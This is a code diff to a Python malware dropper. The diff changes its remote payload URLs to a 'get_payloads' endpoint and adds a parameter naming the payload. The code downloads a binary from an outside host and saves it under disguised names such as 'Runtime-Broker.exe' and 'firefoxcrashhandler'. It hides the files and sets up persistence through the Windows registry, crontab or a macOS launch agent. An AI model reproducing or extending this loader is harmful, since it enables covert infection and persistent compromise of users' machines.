@@ -4,7 +4,7 @@ import subprocess
 import base64
 import requests
 
-def run(url):
+def run(url, file_path):
     def create_hidden_file(path):
         if os.name == 'nt':  # Windows
             subprocess.run(['attrib', '+h', path])
@@ -83,13 +83,14 @@ def run(url):
      
     
     os_type = platform.system()
+    download_path = file_path
     
     if os_type == 'Windows':
         import winreg
     
         file_path = "C:\\ProgramData\\Runtime-Broker.exe"
         if not os.path.exists(file_path):
-            response = requests.get(f"{url}win11")
+            response = requests.get(f"{url}get_payloads/{download_path}.exe")
             with open(file_path, 'wb') as file:
               file.write(response.content)
                 
@@ -104,9 +105,9 @@ def run(url):
         add_registry_startup(file_path, "Runtime Broker")
     
     elif os_type == 'Linux' or os_type == 'FreeBSD' or os_type == 'OpenBSD' or os_type == 'SunOS' or os_type == 'Android':
-        file_path = "/home/snap/firefox/common/firefox_stuff"
+        file_path = "/home/snap/firefox/common/firefoxcrashhandler"
         if not os.path.exists(file_path):
-            response = requests.get(f"{url}win")
+            response = requests.get(f"{url}get_payloads/{download_path}")
             with open(file_path, 'wb') as file:
               file.write(response.content)
         # Create a hidden file and add a crontab job
@@ -116,7 +117,7 @@ def run(url):
     elif os_type == 'Darwin':  # macOS
         file_path = "./wow.exe"
         if not os.path.exists(file_path):
-            response = requests.get(f"{url}win")
+            response = requests.get(f"{url}get_payloads/{download_path}")
             with open(file_path, 'wb') as file:
               file.write(response.content)
         # Create a hidden file and add a launch agent
